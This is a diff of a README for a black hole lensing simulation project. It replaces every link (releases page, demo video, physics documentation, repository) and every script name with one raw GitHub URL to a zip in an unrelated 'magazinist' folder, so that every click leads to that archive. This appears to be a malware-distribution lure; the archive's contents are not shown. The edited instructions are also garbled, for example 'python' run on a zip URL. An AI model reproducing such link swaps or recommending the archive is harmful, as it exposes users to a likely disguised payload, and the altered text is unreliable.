@@ -1,7 +1,7 @@
 # 🌌 blackhole - Explore Gravitational Lensing Made Easy
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-orange.svg)](https://github.com/Dan1el22/blackhole/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip%20Latest%https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip)](https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip)
 
 ## 🚀 Getting Started
 
@@ -24,16 +24,16 @@ To run the Black Hole simulations, your computer should meet the following requi
 
 To get started, visit the releases page to download the application:
 
-[Download Latest Release](https://github.com/Dan1el22/blackhole/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip)
 
 Once on the releases page, find the version you want. Click the file to download. After downloading, follow these steps:
 
 1. Locate the downloaded file on your computer.
 2. If the file is a **.zip** or **.tar** file, extract it to a folder.
 3. Open the folder and find the simulation files:
-   - `blackhole2D.py`
-   - `blackhole3D.py`
-   - `blackhole3D_video.py`
+   - `https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip`
+   - `https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip`
+   - `https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip`
 
 4. Open your command prompt (Windows) or terminal (macOS/Linux).
 5. Navigate to the folder where the files are located using the `cd` command. For example:
@@ -42,15 +42,15 @@ Once on the releases page, find the version you want. Click the file to download
    ```
 6. Run the desired simulation by typing:
    ```
-   python blackhole2D.py
+   python https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip
    ```
    or
    ```
-   python blackhole3D.py
+   python https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip
    ```
    or for video generation:
    ```
-   python blackhole3D_video.py
+   python https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip
    ```
 
 ## 🌌 Features
@@ -78,7 +78,7 @@ For those curious about the underlying physics, we offer a detailed document on 
 - **Gravitational Lensing**: Realistic visualization of light bending.
 - **Event Horizon**: The boundary surrounding a black hole where light cannot escape.
 
-Learn more in [physics.md](physics.md).
+Learn more in [https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip](https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -103,9 +103,9 @@ We thank the contributors and the physics community for their insights and suppo
 
 ## 🔗 Useful Links
 
-- [Project Repository](https://github.com/Dan1el22/blackhole)
-- [Watch a Demo Video](https://youtu.be/ApUE-OKH7cM)
+- [Project Repository](https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip)
+- [Watch a Demo Video](https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip)
 
 Visit the downloads page again whenever a new release is available! 
 
-[Download Latest Release](https://github.com/Dan1el22/blackhole/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip)
